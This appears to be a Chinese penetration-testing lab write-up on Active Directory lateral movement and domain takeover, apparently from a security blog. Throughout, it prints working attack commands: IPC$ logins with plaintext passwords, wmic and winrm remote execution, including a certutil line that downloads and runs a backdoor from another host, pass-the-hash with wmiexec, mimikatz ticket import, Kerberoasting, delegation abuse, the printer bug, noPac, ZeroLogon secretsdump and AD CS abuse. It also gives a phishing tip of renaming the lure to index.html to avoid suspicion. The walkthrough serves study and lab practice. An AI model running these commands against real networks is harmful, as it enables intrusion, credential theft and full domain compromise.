...
> **来源**: https://xz.aliyun.com/news/18020  
> **文章ID**: 18020
...
我们需要判断当前获得的权限是域内的还是域外的，如一个计算机有两个角色，一个是Meteor\_Kai，对应域外用户，一个是webadmin，对应域内用户。
...
kerbrute\_windows\_amd64.exe userenum --dc ip -d 域名 字典文件
...
shell net use \\192.168.3.32\ipc$ "admin!@#45" /user:sqlserver\administrator

![](images/20250523185838-e1af288e-37c4-1.png)

![](images/20250523185839-e24b3f7a-37c4-1.png)

然后生成一个正向后门

![](images/20250523185841-e30eae8b-37c4-1.png)

copy后门到3.32

![](images/20250523185842-e3b890bd-37c4-1.png)

查看是否成功

![](images/20250523185843-e4550bda-37c4-1.png)

然后准备执行，利用计划任务。

![](images/20250523185844-e4eb51a5-37c4-1.png)

那就换一种计划任务。

![](images/20250523185845-e582152e-37c4-1.png)

问了下小迪才知道是权限过低的原因，那么我们需要先提权。

![](images/20250523185846-e6236179-37c4-1.png)

试了半天，发现工作组的administrator可以，有点奇怪哦

![](images/20250523185847-e6c0a966-37c4-1.png)

![](images/20250523185848-e766ccba-37c4-1.png)

成功运行计划任务，然后我们去主动连接即可，因为是正向后门。

connect 192.168.3.32 3232

![](images/20250523185849-e800fa8a-37c4-1.png)
...
![](images/20250523185851-e91822c6-37c4-1.png)

然后配置一下proxifier即可

![](images/20250523185853-ea5e3375-37c4-1.png)
...
![](images/20250523185854-eb31acf1-37c4-1.png)
...
![](images/20250523185855-ebec4e11-37c4-1.png)
...
![](images/20250523185857-ecf19130-37c4-1.png)

![](images/20250523185859-edf6c597-37c4-1.png)

##### 利用3 cs插件

cs-psexec

![](images/20250523185900-eee3ba66-37c4-1.png)
...
![](images/20250523185902-efe36672-37c4-1.png)

shell wmic /node:192.168.3.32 /user:sqlserver\administrator /password:admin!@#45 process call create "c:/3232.exe"

![](images/20250523185903-f0aa27a6-37c4-1.png)

![](images/20250523185905-f14fc703-37c4-1.png)

然后connect正向连接

![](images/20250523185906-f1f63a89-37c4-1.png)
...
![](images/20250523185907-f2a03526-37c4-1.png)

然后proxifier配置代理服务器

![](images/20250523185908-f36c11e3-37c4-1.png)

然后python执行即可。

![](images/20250523185910-f4654038-37c4-1.png)

获取一个shell

![](images/20250523185912-f5b81f78-37c4-1.png)
...
![](images/20250523185914-f7251ef4-37c4-1.png)

然后去cs正向连接即可上线！

![](images/20250523185916-f80f3345-37c4-1.png)

以下展示hash的连接：

![](images/20250523185917-f8df94a9-37c4-1.png)

##### 利用4 cs插件

wmihacker==cscript

![](images/20250523185919-f9d16b02-37c4-1.png)

#### DCOM

参考文章：<https://mp.weixin.qq.com/s/9u0kprGbaU1S1BEQWj18AA>
...
![](images/20250523185920-facd1c33-37c4-1.png)
...
![](images/20250523185922-fb9f9efa-37c4-1.png)

![](images/20250523185923-fc89ff07-37c4-1.png)
...
![](images/20250523185925-fd59173a-37c4-1.png)
...
![](images/20250523185926-fe05861f-37c4-1.png)

![](images/20250523185927-fedded17-37c4-1.png)

上述操作是在本机上进行的，是由图形化界面的，但是在cs上执行不了。。鸡肋了。

![](images/20250523185928-ff8121e2-37c4-1.png)

![](images/20250523185929-000d4a3b-37c5-1.png)

这又是为啥呢？小迪表示是cs命令终端的回显导致的。

实战中不太现实。解决办法也是有的，如下所示：（通过winrm.cmd来进行命令执行）

shell winrm invoke Create wmicimv2/win32\_process @{CommandLine="cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/3232.exe 3232.exe & 3232.exe"} -r:sqlserver -u:sqlserver\administrator -p:admin!@#45

![](images/20250523185930-00c363cc-37c5-1.png)

由于是正向后门，然后我们去connect

![](images/20250523185932-017c208e-37c5-1.png)

**cs插件按理来说也是可行的。**但是我试了不行。。莫非是cs问题？？还是环境问题？？不知道。。

![](images/20250523185933-02591e30-37c5-1.png)
...
![](images/20250523185934-030fa97e-37c5-1.png)
...
![](images/20250523185936-0401d8d3-37c5-1.png)

![](images/20250523185937-04e1d996-37c5-1.png)

我们目前连接是肯定连接不上的，毋庸置疑

![](images/20250523185939-05a8a592-37c5-1.png)

开启http隧道，进行端口映射后

![](images/20250523185940-067eb70b-37c5-1.png)

However，可能是因为流量太大了，不好搞啊！但是思路是没有问题的。

![](images/20250523185942-0773f2d7-37c5-1.png)
...
![](images/20250523185943-08476b2f-37c5-1.png)

![](images/20250523185944-0906e338-37c5-1.png)
...
关于LM和NTLM文章：<https://y4er.com/posts/ntlm-hash-and-lm-hash/>

##### PTH

![](images/20250523185945-09ba275e-37c5-1.png)

![](images/20250523185948-0b645337-37c5-1.png)
...
![](images/20250523185949-0bef5587-37c5-1.png)

![](images/20250523185951-0cc15103-37c5-1.png)

这里执行成功后执行dir是不可以的

![](images/20250523185952-0d607ea0-37c5-1.png)
...
![](images/20250523185953-0deb2dc1-37c5-1.png)
...
一次详细的Kerberoast攻击演示：<https://www.freebuf.com/articles/system/174967.html>
...
![](images/20250523185953-0e70ce93-37c5-1.png)

S-1-5-21-1218902331-2157346161-1782232778-1132

然后上传exe

![](images/20250523185955-0f3000b6-37c5-1.png)
...
![](images/20250523185956-0fcdd37a-37c5-1.png)

然后ls一下发现多出了票据文件

![](images/20250523185957-10648ee6-37c5-1.png)

![](images/20250523185958-10f0ee55-37c5-1.png)
...
![](images/20250523185959-11811ed8-37c5-1.png)

然后，我们使用mimikatz内存导入票据。

mimikatz kerberos::ptc TGT\_webadmin@god.org.ccache

![](images/20250523185959-120f7f76-37c5-1.png)

接着我们klist一下

![](images/20250523190001-12b5db19-37c5-1.png)

就是我们刚刚导入的票据！

然后就能正常dir等操作了。

![](images/20250523190001-133f5715-37c5-1.png)
...
![](images/20250523190002-13cc176c-37c5-1.png)

![](images/20250523190003-1457566a-37c5-1.png)

然后可以dir一下，发现成功复制

![](images/20250523190004-14e9c9b0-37c5-1.png)

![](images/20250523190005-1578ced7-37c5-1.png)

上述注册binpath=后面的一个空格，不然会报help

然后执行任务，connect连接，成功上线dc

![](images/20250523190006-1626ab02-37c5-1.png)

但是有个小bug？莫非是工具的问题？过了一小段时间就失效了，可能需要权限维持。

![](images/20250523190008-16f3774f-37c5-1.png)
...
![](images/20250523190009-17a44b88-37c5-1.png)

ls发现新生成了一个票据文件

![](images/20250523190010-186d5e85-37c5-1.png)
...
![](images/20250523190011-1917bb3b-37c5-1.png)

接着我们klist一下发现成功导入

![](images/20250523190012-19b2e9db-37c5-1.png)

![](images/20250523190013-1a4cd701-37c5-1.png)
...
![](images/20250523190014-1ae1994c-37c5-1.png)

接着我们可以ls一下，发现多了好多东西

![](images/20250523190015-1b8475dc-37c5-1.png)
...
![](images/20250523190016-1c1ea48d-37c5-1.png)

这个漏洞存在的关键点就是有没有与域控产生过连接。

接下来我们模拟产生连接！登陆一下。然后我们再导出票据，看看会不会多出什么东西。

![](images/20250523190018-1cde19f4-37c5-1.png)

额。。。没有多出来，莫非是这种PAC的账号密码输进去没用？试一下直接在web主机上登录域控账号。

![](images/20250523190019-1dababe6-37c5-1.png)

然后再去导出一次！

![](images/20250523190020-1e742959-37c5-1.png)

芜湖！！！Administrator出来啦！

一般情况下我们先用40开头的，不行的话换60开头的。

![](images/20250523190022-1f3dc75a-37c5-1.png)
...
![](images/20250523190023-1fe37df8-37c5-1.png)

然后我们导入票据再连接，此处我把票据文件放到桌面上了，所以不用加路径！

![](images/20250523190024-2088f47b-37c5-1.png)
...
![](images/20250523190025-2127d0e3-37c5-1.png)

![](images/20250523190026-21bb6f5c-37c5-1.png)
...
![](images/20250523190027-225398cd-37c5-1.png)
...
![](images/20250523190028-22e6b683-37c5-1.png)

klist发现多出了票据！

![](images/20250523190029-23815eb1-37c5-1.png)
...
![](images/20250523190030-2426a217-37c5-1.png)

shell Rubeus kerberoast

![](images/20250523190031-24c0900a-37c5-1.png)

此类攻击方法在当前主机不行，因为我们之前看过，加密类型不是RC4的

那么接下来我们换一个域环境-0day.org，上线有与kali同一网段的jack主机

![](images/20250523190032-254e93b2-37c5-1.png)
...
![](images/20250523190033-25e611b1-37c5-1.png)

存在攻击的点！以上是用Rubeus工具，接下来用impacket套件试试

首先在信息收集阶段，我们需要知道DC的ip地址

![](images/20250523190034-269cc38f-37c5-1.png)
...
![](images/20250523190036-2793491e-37c5-1.png)

![](images/20250523190037-2881e3ce-37c5-1.png)

其实我们直接klist也可以知道加密类型

![](images/20250523190038-2925e52b-37c5-1.png)
...
![](images/20250523190039-29b8a76a-37c5-1.png)

再尝试了一下powershell的方法，还是不行，那就用mimikatz吧。。

mimikatz kerberos::ask /target:MSSQLSvc/Srv-DB-0day.0day.org:1433

![](images/20250523190040-2a4d5f8b-37c5-1.png)

成功后klist一下

![](images/20250523190041-2ae33fc9-37c5-1.png)
...
![](images/20250523190042-2b75dc58-37c5-1.png)
...
![](images/20250523190043-2c2c6d52-37c5-1.png)

直接破解出来啦！Admin12345，我们可以看看dc上的说明，发现我们获取了sqlsvr的密码！

![](images/20250523190045-2d0c0d04-37c5-1.png)
...
![](images/20250523190046-2de806da-37c5-1.png)
...
![](images/20250523190047-2e9a1e86-37c5-1.png)

![](images/20250523190048-2f3cf4b3-37c5-1.png)

执行后web主机弹出一个shell，拥有system权限，但仍然是web主机的，没成功横向移动

![](images/20250523190049-2fcf9af2-37c5-1.png)
...
参考文章：<https://forum.butian.net/share/1591>
...
![](images/20250523190050-306161ae-37c5-1.png)

主机账户：计算机系统的主机账户，用于正常用户登入计算机使用。

![](images/20250523190052-313f6574-37c5-1.png)
...
![](images/20250523190053-31eb923d-37c5-1.png)
...
![](images/20250523190054-32a5f76e-37c5-1.png)
...
![](images/20250523190055-3345e056-37c5-1.png)

查到了一个webadmin！接下来我们可以对比一下，如果我们把webadmin的委派去掉，回显如何？

![](images/20250523190056-33d7a8f9-37c5-1.png)

（查询域内是否设置了非约束委派机器账户）如果返回0或者只有一个dc那就不存在委派攻击![](images/20250523190057-34812b05-37c5-1.png)
...
![](images/20250523190058-3509bb10-37c5-1.png)

对于钓鱼的方法这里也同步演示一下

![](images/20250523190059-359920a0-37c5-1.png)

给他传到web主机。这里我也直接改了个名，改成index.html了！

![](images/20250523190100-3643e014-37c5-1.png)

然后让域控在浏览器访问一下web主机的web服务

最好把31.html命令为index.html，那样的话直接访问首页就行，不容易被怀疑！

![](images/20250523190101-36da288f-37c5-1.png)

然后导出就行，一个道理，虽然我本地复现失败了，没有administrator的，环境问题？

![](images/20250523190102-3770bc98-37c5-1.png)

**2.导出票据到本地**

mimikatz sekurlsa::tickets /export

![](images/20250523190103-381c926f-37c5-1.png)
...
![](images/20250523190104-38b762d1-37c5-1.png)

然后我们导入票据

![](images/20250523190105-39437966-37c5-1.png)

**4.连接通讯域控**

shell dir \\owa2010cn-god\c$

![](images/20250523190106-39d368bf-37c5-1.png)
...
![](images/20250523190107-3a5f0440-37c5-1.png)

![](images/20250523190108-3aff2702-37c5-1.png)

![](images/20250523190109-3b8b03c8-37c5-1.png)

![](images/20250523190110-3c41549c-37c5-1.png)

成功上线！

##### 利用思路2：结合打印机漏洞

**利用条件：DC 2012以上**（重要，不然就报错用不了，而且网上说2012好像也不行，我这里用2016来做。）

1、Administrator权限监听

2、打印机服务spooler开启（默认开启）

![](images/20250523190112-3d54f344-37c5-1.png)

这里我们使用内网域-打印机漏洞环境

首先设置机器账户和主机账户的委派

![](images/20250523190114-3e418980-37c5-1.png)

上线web主机，上线管理员＋域用户，提权就不演示了，土豆家族

![](images/20250523190115-3eee5a55-37c5-1.png)

把Rubeus和SpoolSample工具上传

![](images/20250523190116-3f7bd402-37c5-1.png)
...
![](images/20250523190117-4008ca0f-37c5-1.png)

注意此处监听命令要以Administrator的权限去执行，不能以域用户的命令执行。否则产生的hash.txt中会有如下报错：

![](images/20250523190118-40a76e4f-37c5-1.png)

正确如下：

![](images/20250523190119-41617770-37c5-1.png)
...
![](images/20250523190120-420a20f3-37c5-1.png)

执行完成后我们发现hash.txt中有数据了，把它下载下来

![](images/20250523190121-429e0d8d-37c5-1.png)

![](images/20250523190122-438958ea-37c5-1.png)
...
![](images/20250523190124-4463f179-37c5-1.png)
...
![](images/20250523190125-450da447-37c5-1.png)

成功获取到hash，那么接下来我们可以通过之前说过的基于口令凭据，利用hash来进行横向移动

4、使用wmi借助hash横向移动

python wmiexec.py -hashes :e6f01fc9f2a0dc96871220f7787164bd xiaodi8.com/administrator@dc.xiaodi8.com -no-passpython wmiexec.py -hashes :e6f01fc9f2a0dc96871220f7787164bd xiaodi8.com/administrator@192.168.139.11 -no-pass

此处我用上面的不行，改成下面的ip形式则可以。要改hosts文件才能用上面那种！否则解析不了域名！会解析到外网去。

想要知道域控ip也很简单

![](images/20250523190126-45a53f86-37c5-1.png)

使用域名的结果：

![](images/20250523190127-4645e194-37c5-1.png)

因此我们要改hosts文件

![](images/20250523190128-46fe026b-37c5-1.png)

![](images/20250523190130-48281b0a-37c5-1.png)

完美拿捏！

直接使用ip地址：

![](images/20250523190133-49ad3e96-37c5-1.png)
...
S4U2self协议允许服务代表任意用户请求访问自身服务的ST服务票据S4U2proxy协议允许服务在已取得ST服务票据下代表任意用户获取另一个服务的服务票据约束委派限制了S4U2proxy协议的请求范围，使得配置了委派属性的服务只能模拟用户身份访问**特定**的其他服务。
...
CIFS，通用网络文件系统协议。CIFS 是一个新提出的协议，它使程序可以访问远程Internet计算机上的文件并要求此计算机提供服务。CIFS 使用[客户/服务器](https://baike.baidu.com/item/客户%2F服务器/3351471?fromModule=lemma_inlink)模式。客户程序请求远在服务器上的服务器程序为它提供服务。服务器获得请求并返回响应。CIFS是公共的或开放的[SMB协议](https://baike.baidu.com/item/SMB%E5%8D%8F%E8%AE%AE/3770892?fromModule=lemma_inlink)版本，并由Microsoft使用。[SMB协议](https://baike.baidu.com/item/SMB%E5%8D%8F%E8%AE%AE/3770892?fromModule=lemma_inlink)在局域网上用于服务器文件访问和打印的协议。像SMB协议一样，CIFS在高层运行，而不像[TCP/IP协议](https://baike.baidu.com/item/TCP%2FIP协议/212915?fromModule=lemma_inlink)那样运行在底层。CIFS可以看做是[应用程序](https://baike.baidu.com/item/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/5985445?fromModule=lemma_inlink)协议如[文件传输协议](https://baike.baidu.com/item/%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE/1874113?fromModule=lemma_inlink)和[超文本传输协议](https://baike.baidu.com/item/%E8%B6%85%E6%96%87%E6%9C%AC%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE/8535513?fromModule=lemma_inlink)的一个实现。

配置约束委派

![](images/20250523190135-4ae30a35-37c5-1.png)

![](images/20250523190136-4bb591ba-37c5-1.png)
...
![](images/20250523190139-4d872858-37c5-1.png)

![](images/20250523190140-4e158ec3-37c5-1.png)
...
shell kekeo "tgs::s4u /tgt:TGT\_webadmin@GOD.ORG\_krbtgt~god.org@GOD.ORG.kirbi /user:Administrator@god.org /service:cifs/owa2010cn-god.god.org" "exit"

![](images/20250523190142-4ef36e7c-37c5-1.png)

成功执行后生成两个TGS文件（票据授权服务器）

![](images/20250523190143-4f8c160f-37c5-1.png)

3、导入票据到内存

mimikatz kerberos::ptt TGS\_Administrator@god.org@GOD.ORG\_cifs~owa2010cn-god.god.org@GOD.ORG.kirbi

在导入之前我们可以先尝试连接一下，看能否访问上。

![](images/20250523190143-50121f98-37c5-1.png)

毋庸置疑是不可以的。

那么接下来我们通过mimikatz来导入票据到内存中去。

![](images/20250523190144-50a4942e-37c5-1.png)

4、连接通讯域控

shell dir \\owa2010cn-god.god.org\c$

![](images/20250523190146-514ecc27-37c5-1.png)
...
![](images/20250523190147-51e4a0e2-37c5-1.png)

![](images/20250523190147-52731ace-37c5-1.png)
...
![](images/20250523190149-535ab46f-37c5-1.png)

生成了如下票据文件：

![](images/20250523190150-542a3c48-37c5-1.png)
...
![](images/20250523190151-54c80f88-37c5-1.png)
...
![](images/20250523190152-556128f1-37c5-1.png)

mimikatz kerberos::ptc administrator.ccache

![](images/20250523190153-55fe40ce-37c5-1.png)

![](images/20250523190154-56a1447e-37c5-1.png)

然后尝试连接！

shell dir \\owa2010cn-god.god.org\c$

![](images/20250523190156-573e3754-37c5-1.png)
...
![](images/20250523190157-57f81bb5-37c5-1.png)
...
![](images/20250523190158-58aa2ac0-37c5-1.png)

此时我们登陆的是dbadmin（域内的用户），发现DATA的和WEB的sid值一致。

接下来我们要退出域重新加域（本地管理员用户才行），做实验

![](images/20250523190159-598e0b6e-37c5-1.png)

退出域成功了，我们重新加域，换个名字加webadmin

![](images/20250523190201-5a7820ff-37c5-1.png)

再次查询被域用户创建的机器账户列表，sid就会不同。

![](images/20250523190202-5b2909a0-37c5-1.png)
...
![](images/20250523190203-5bd06934-37c5-1.png)

根据查询出来的sid找出对应的用户名：

shell AdFind.exe -b "DC=xiaodi,DC=local" -f "(&(objectsid=S-1-5-21-1695257952-3088263962-2055235443-1104))" objectclass cn dn

![](images/20250523190204-5c6b52a7-37c5-1.png)

刚好，这个dbadmin是被我们控制的

![](images/20250523190205-5d1db684-37c5-1.png)
...
![](images/20250523190207-5ddbb026-37c5-1.png)

![](images/20250523190208-5e9a3411-37c5-1.png)

同时我们也上传一个这个，后续会用到

![](images/20250523190209-5f599937-37c5-1.png)

![](images/20250523190210-6006cfc7-37c5-1.png)

然后我们看DC，确实多了一个机器账户

![](images/20250523190211-60943575-37c5-1.png)
...
![](images/20250523190212-611d1174-37c5-1.png)
...
![](images/20250523190213-61b60a6e-37c5-1.png)

那么命令执行后serviceA就能资源委派控制data，然后我们用serviceA上的票据去模拟访问data，就能拿到data的权限

![](images/20250523190214-624da8c2-37c5-1.png)

![](images/20250523190215-62fa9c2a-37c5-1.png)
...
![](images/20250523190217-63c16daf-37c5-1.png)

成功生成了票据文件。其实就是serviceA访问data生成的票据

导入票据到内存：

mimikatz kerberos::ptc administrator@cifs\_data.xiaodi.local@XIAODI.LOCAL.ccache

我们先事先dir一下看看

![](images/20250523190218-6472c8a9-37c5-1.png)

然后导入票据到内存

![](images/20250523190219-650b1903-37c5-1.png)

连接利用票据：

shell dir \\data.xiaodi.local\c$

![](images/20250523190220-65a6068a-37c5-1.png)
...
![](images/20250523190221-6694bd91-37c5-1.png)

![](images/20250523190223-6783d695-37c5-1.png)
...
![](images/20250523190224-683ba047-37c5-1.png)
...
![](images/20250523190225-68dbb32b-37c5-1.png)

出现这种情况，说明没有属于Account Operators组的，攻击条件不成立，接下来我们添加一下Account Operators组成员

![](images/20250523190227-69bdb934-37c5-1.png)

然后我们再查询一下

![](images/20250523190228-6a754c95-37c5-1.png)
...
![](images/20250523190229-6b0de098-37c5-1.png)
...
![](images/20250523190230-6bac5c4b-37c5-1.png)

![](images/20250523190231-6c45a9dd-37c5-1.png)

![](images/20250523190232-6cfead67-37c5-1.png)
...
![](images/20250523190233-6d999c0a-37c5-1.png)
...
![](images/20250523190234-6e37a1e8-37c5-1.png)
...
![](images/20250523190235-6efd4f9e-37c5-1.png)

![](images/20250523190237-700b8e4c-37c5-1.png)
...
![](images/20250523190238-70a182a2-37c5-1.png)

mimikatz kerberos::ptc administrator@cifs\_data.xiaodi.local@XIAODI.LOCAL.ccache

![](images/20250523190239-712dd90e-37c5-1.png)

然后我们再访问一下

![](images/20250523190240-71bc40de-37c5-1.png)
...
![](images/20250523190241-727466d7-37c5-1.png)
...
![](images/20250523190243-736a66ff-37c5-1.png)

以下是web主机用webadmin用户登录，sql主机用administrator用户登陆的场景。

![](images/20250523190245-7470f3e7-37c5-1.png)
...
**同时我们也有强制的方法！**（主动）：这时我们可以联想到非约束委派中的利用思路2：结合打印机漏洞。我们主动让对面访问我们的监听主机。
...
![](images/20250523190246-750a32bb-37c5-1.png)

![](images/20250523190247-75b15563-37c5-1.png)

2.SPN扫描

powershell setspn -T 0day.org -q \*/\*

![](images/20250523190248-7643b7ac-37c5-1.png)

3.脚本探针

python Exchange\_GetVersion\_MatchVul.py 192.168.3.142

![](images/20250523190249-770aff61-37c5-1.png)

成功探测到以后，我们要建立一下socks代理，让本机能够访问到3.142。

我们用谷歌啥的不可以，试了下火狐渗透版，高级选项里添加一个例外即可成功。

![](images/20250523190251-780a488c-37c5-1.png)

**接下来想要知道Exchange版本可以用上面脚本探针的方法，也可以查看源代码！！**

![](images/20250523190252-789ffde6-37c5-1.png)
...
![](images/20250523190253-79795ec3-37c5-1.png)

![](images/20250523190255-7a9e1596-37c5-1.png)
...
![](images/20250523190256-7b4c6136-37c5-1.png)
...
![](images/20250523190257-7be229c6-37c5-1.png)

接下来hashcat即可。

说实话直接抓取明文密码也可以的！

![](images/20250523190258-7ca3588a-37c5-1.png)

得到账号jack，密码admin!@#45

接下来关注的是exp了

![](images/20250523190300-7d8ed2ed-37c5-1.png)

data其实就是webshell的内容，我们随便改一下就行。

看看exe的用法

![](images/20250523190301-7e3aab4d-37c5-1.png)

后面接上域名和username和password

![](images/20250523190302-7ec62bae-37c5-1.png)

![](images/20250523190304-7fc6e77c-37c5-1.png)

出现了一些问题。。可能是域名的问题，本地hosts没有设置！

后来我用ip试了一下，发现可以！

![](images/20250523190306-80f974c0-37c5-1.png)

然后我们手动重启一下Exchange服务器。

![](images/20250523190307-81e7722b-37c5-1.png)

确实多出了这个Services.aspx

这就可以实现写后门从而获得webshell权限啦！

![](images/20250523190308-8294e3f0-37c5-1.png)

###### CVE-2020-0688

利用条件：Exchange Server 2010 SP3/2013/2016/2019，普通账号。

![](images/20250523190310-838ee6e6-37c5-1.png)

这里要我们自行执行一下ysoserial.exe那条命令，将结果input

![](images/20250523190312-84ad85fe-37c5-1.png)

![](images/20250523190314-86221d62-37c5-1.png)

但是，可悲的事情发生了

![](images/20250523190316-8740fecb-37c5-1.png)
...
![](images/20250523190317-87e11df2-37c5-1.png)

2.Socks代理后：

修改hosts绑定域名和ip

![](images/20250523190318-88a1864b-37c5-1.png)
...
![](images/20250523190320-89b06fef-37c5-1.png)
...
![](images/20250523190322-8b1443ea-37c5-1.png)

出现了一大堆。所有dc上保存的用户的hash值。

![](images/20250523190325-8c8f7117-37c5-1.png)
...
![](images/20250523190327-8dc0c61c-37c5-1.png)
...
![](images/20250523190330-8f4cd96e-37c5-1.png)
...
![](images/20250523190332-90d21384-37c5-1.png)

接下来重制密码域控的机器密码

python reinstall\_original\_pw.py OWA2010CN-God$ 192.168.3.21 4a70cc01733be14c813e5f7a06d5a7fa

![](images/20250523190336-92dbcb4d-37c5-1.png)

接下来查看一下密码是否恢复成功了：（下面四种方法都是可以的，上面两种是用原来的密码来试，成功就行；下面两种是用空密码来试，不成功就行）

python secretsdump.py god/administrator:Admin12345@192.168.3.21 -just-dc-user OWA2010CN-God$python secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21 -just-dc-user OWA2010CN-God$python secretsdump.py god/OWA2010CN-God$@192.168.3.21 -just-dc -no-passpython secretsdump.py god/OWA2010CN-God$@192.168.3.21 -no-pass

![](images/20250523190337-93fbce30-37c5-1.png)

![](images/20250523190339-94c988ed-37c5-1.png)

成功恢复啦！

#### CVE-2021-42287

CVE-2021-42278，机器账户的名字一般来说应该以$结尾，但AD没有对域内机器账户名做验证。CVE-2021-42287，与上述漏洞配合使用，创建与DC机器账户名字相同的机器账户（不以$结尾），账户请求一个TGT后，更名账户，然后通过S4U2self申请TGS Ticket，接着DC在TGS\_REP阶段，这个账户不存在的时候，DC会使用自己的密钥加密TGS Ticket，提供一个属于该账户的PAC，然后我们就得到了一个高权限ST。
...
![](images/20250523190340-95632fb0-37c5-1.png)

![](images/20250523190342-966c115b-37c5-1.png)

发现Got TGT，成功了可以进行漏洞利用。

python noPac.py -use-ldap "god.org/webadmin:admin!@#45" -dc-ip 192.168.3.21 -shell

![](images/20250523190344-97b179c1-37c5-1.png)
...
![](images/20250523190347-997efd00-37c5-1.png)

![](images/20250523190350-9b3f8a8c-37c5-1.png)

![](images/20250523190353-9cf91782-37c5-1.png)
...
![](images/20250523190354-9dc307fb-37c5-1.png)
...
![](images/20250523190355-9eb7585d-37c5-1.png)

工具如下：<https://github.com/ly4k/Certipy>

首先在cs中获取CA结构名和计算机名

shell certutil

![](images/20250523190357-9f6ea939-37c5-1.png)
...
![](images/20250523190358-a018b592-37c5-1.png)
...
![](images/20250523190359-a0f068e0-37c5-1.png)

2.申请低权限用户证书：

proxychains4 certipy-ad req -u test@xiaodi.lab -p Pass123 -dc-ip 192.168.3.111 -ca xiaodi-DC-CA -template User -debug

该命令使用 Certipy-AD 请求活动目录证书服务（AD CS）的用户证书，并输出详细的调试信息。

![](images/20250523190401-a206c5cd-37c5-1.png)
...
![](images/20250523190403-a2f46883-37c5-1.png)
...
![](images/20250523190404-a3cdcaaa-37c5-1.png)

只存在一个web用户，接下来我们创建一个机器用户。

![](images/20250523190405-a488ef52-37c5-1.png)

![](images/20250523190407-a552f668-37c5-1.png)
...
![](images/20250523190408-a637ccf3-37c5-1.png)
...
![](images/20250523190414-a9832180-37c5-1.png)
...
![](images/20250523190415-aa8fe70e-37c5-1.png)

这里当时卡了挺久的！问了AI才发现问题！

![](images/20250523190417-aba86187-37c5-1.png)

接下来我们对hash进行利用即可！

Administrator:500:aad3b435b51404eeaad3b435b51404ee:518b98ad4178a53695dc997aa02d455cproxychains4 python3 wmiexec.py -hashes :518b98ad4178a53695dc997aa02d455c xiaodi.lab/administrator@192.168.3.111 "whoami"

![](images/20250523190419-aca596a1-37c5-1.png)
...
![](images/20250523190420-ad7f21bc-37c5-1.png)
...
![](images/20250523190422-ae4c4b65-37c5-1.png)
...
![](images/20250523190423-af42b114-37c5-1.png)
...
![](images/20250523190425-b0495f98-37c5-1.png)

![](images/20250523190427-b15fd646-37c5-1.png)
...
![](images/20250523190428-b21618f7-37c5-1.png)

然后改一下/etc/proxychains4.conf文件

![](images/20250523190429-b2febd15-37c5-1.png)

然后我们发现加上proxychains就能正常访问3网段

![](images/20250523190431-b41f662c-37c5-1.png)

接下来我们看看crackmapexec的--help，使用说明

![](images/20250523190433-b5460fcb-37c5-1.png)

先获取一下user.txt吧

![](images/20250523190435-b6125ad2-37c5-1.png)
...
![](images/20250523190436-b6e86b8e-37c5-1.png)
...
![](images/20250523190445-bc2b7543-37c5-1.png)
...
![](images/20250523190448-bdd15982-37c5-1.png)

![](images/20250523190450-bf1073ac-37c5-1.png)
...
![](images/20250523190452-c02dd6f8-37c5-1.png)
